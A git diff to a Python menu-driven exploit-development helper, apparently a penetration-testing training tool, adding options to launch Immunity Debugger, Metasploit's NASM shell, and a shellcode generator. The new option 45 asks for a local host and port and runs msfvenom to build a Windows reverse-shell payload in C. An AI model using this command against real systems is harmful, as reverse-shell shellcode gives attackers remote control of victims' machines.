@@ -434,9 +434,9 @@ def dispMenu():
 def options():
    print('\u2551' + "(01) Set  ACCUMULATOR (11) Set FILE  FORMAT (21) Read File Head (31) Pattern   Creater (41) HEX Editor   " + '\u2551', end=' '); print(colored(GADD[14],colour6), end=' '); print('\u2551')
    print('\u2551' + "(02) Set BASE POINTER (12) Set ARCHITECTURE (22) Read   Objects (32) Initiate  Program (42) GHIDRA       " + '\u2551', end=' '); print(colored(GADD[15],colour6), end=' '); print('\u2551')
-   print('\u2551' + "(03) Set LOOP COUNTER (13) Set INDIAN  Type (23) Read   Section (33) G.D.B.  Interface (43)              " + '\u2551', end=' '); print(colored(GADD[16],colour6), end=' '); print('\u2551')  
-   print('\u2551' + "(04) Set DATALOCATION (14) Set Program Name (24) Read   Headers (34) Find SegmentFault (44)              " + '\u2551', end=' '); print(colored(GADD[17],colour6), end=' '); print('\u2551')
-   print('\u2551' + "(05) Set SOURCE INDEX (15) Use Static  Mode (25) Read   Execute (35) Set BUFFER OFFSET (45)              " + '\u2551', end=' '); print(colored(GADD[18],colour6), end=' '); print('\u2551')
+   print('\u2551' + "(03) Set LOOP COUNTER (13) Set INDIAN  Type (23) Read   Section (33) G.D.B.  Interface (43) ImmunityDeBug" + '\u2551', end=' '); print(colored(GADD[16],colour6), end=' '); print('\u2551')  
+   print('\u2551' + "(04) Set DATALOCATION (14) Set Program Name (24) Read   Headers (34) Find SegmentFault (44) NASM Shell   " + '\u2551', end=' '); print(colored(GADD[17],colour6), end=' '); print('\u2551')
+   print('\u2551' + "(05) Set SOURCE INDEX (15) Use Static  Mode (25) Read   Execute (35) Set BUFFER OFFSET (45) Gen Shellcode" + '\u2551', end=' '); print(colored(GADD[18],colour6), end=' '); print('\u2551')
    print('\u2551' + "(06) Set DESTIN INDEX (16) Use Dynamic Mode (26) Read DeBugInfo (36) Dis-Assemble MAIN (46)              " + '\u2551', end=' '); print(colored(GADD[19],colour6), end=' '); print('\u2551')
    print('\u2551' + "(07) Set STACKPOINTER (17) Examine  Program (27) Read   Intamix (37) Dis-Assemble ADDR (47)              " + '\u2551', end=' '); print(colored(GADD[20],colour6), end=' '); print('\u2551')
    print('\u2551' + "(08) Set BASE POINTER (18) CheckSec Program (28) Read   Symbols (38) Dis-Assemble FUNC (48)              " + '\u2551', end=' '); print(colored(GADD[21],colour6), end=' '); print('\u2551')
@@ -1390,6 +1390,17 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TRY HARDER                                                             
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '40':
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TRY HARDER                                                             
 # Details : Menu option selected - Hex Editor.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1416,6 +1427,55 @@ while True:
       else:
          print(colored("[*] Ghidra has been initiated...", colour3))          
          command("/opt/ghidra_9.2.2_PUBLIC/ghidraRun ./analyzeHeadless ./" + localDir + " -import " + localDir + "/" + FIL.rstrip(" ") + " > boot.tmp 2>&1")
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TRY HARDER                                                             
+# Details : Menu option selected - Start Immunity Debugger.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '43':
+      if FIL[:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
+      else:
+         print(colored("[*] Immunity debugger has been initiated...", colour3))          
+         command("env WINEPREFIX='/root/.wine' wine C:/\windows/\command/\start.exe /Unix /root/.wine/dosdevices/c:/users/Public/Desktop/Immunity\ Debugger.lnk > boot.tmp 2>&1")
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TRY HARDER                                                             
+# Details : Menu option selected - Start nasm_shell.rb.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '44':
+      if FIL[:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
+      else:
+         print(colored("[*] Nasm shell initiated...", colour3))          
+         command("/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TRY HARDER                                                             
+# Details : Menu option selected - Start nasm_shell.rb.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '45':
+      if FIL[:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
+      else:
+         localHost = input("[?] Please enter localhost value: ")
+         localPort = input("[?] Please enter localport value: ")
+         command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x86")         
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
